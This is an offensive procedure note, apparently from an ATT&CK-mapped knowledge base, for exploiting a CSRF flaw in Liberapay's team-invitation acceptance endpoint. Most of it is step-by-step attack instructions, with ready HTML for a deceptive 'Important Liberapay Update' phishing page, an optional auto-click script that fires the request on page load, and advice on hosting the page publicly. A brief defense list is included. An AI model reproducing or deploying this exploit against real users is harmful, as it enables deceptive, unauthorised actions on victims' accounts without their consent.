---
id: proc-uuid-2
tags:
  - csrf
  - html-phishing
  - web-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:23.276Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-HTML-for-CSRF-Trigger

## Summary

This procedure details creating a malicious HTML page that exploits the CSRF vulnerability in Liberapay's team invitation acceptance by embedding a link to the unprotected GET endpoint.

## Description

The Liberapay acceptance process uses a simple GET request to https://liberapay.com/{team}/membership/accept without CSRF token validation, making it susceptible to cross-site triggering. The attacker crafts an HTML page with an anchor link (or auto-click script) to this endpoint. When the authenticated victim visits the page and clicks (or auto-triggers), the browser sends the request, accepting the invitation. The page can be hosted on any public server to mimic a legitimate site.

## Requirements

1. Knowledge of the team slug (e.g., 'test-team')
2. Text editor or HTML authoring tool
3. Hosting service for the malicious page (e.g., GitHub Pages, free web host)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints
- Use POST instead of GET for sensitive actions
- Scan for and block suspicious referrer headers in logs

## Objectives

1. Create a functional CSRF trigger via HTML link
2. Host the page accessibly for delivery to the victim
3. Ensure the link executes a cross-site GET request

## Instructions

### Step 1: Write the HTML Content

**Context**: Build the basic structure with a deceptive message and the malicious link.

Create a file named index.html with content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Important Liberapay Update</title>
</head>
<body>
    <h1>Accept Your Team Invitation</h1>
    <p>To proceed, please click the link below:</p>
    <a href="https://liberapay.com/test-team/membership/accept">Accept Invitation</a>
</body>
</html>
```
Replace 'test-team' with the actual team slug.

### Step 2: Add Auto-Click for Stealth (Optional)

**Context**: Enhance deception by automatically triggering the link on page load.

Add this script before </body>:

```html
<script>
    window.onload = function() {
        document.querySelector('a[href*="membership/accept"]').click();
    };
</script>
```

**Expected Output**: Page that redirects or clicks the link seamlessly.

### Step 3: Host the Page

**Context**: Upload to a public server to generate a shareable URL.

Upload to a hosting service and note the public URL (e.g., https://attacker.github.io/phish.html).

**Expected Output**: Publicly accessible page ready for delivery.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html-phishing]]
- [[web-exploit]]
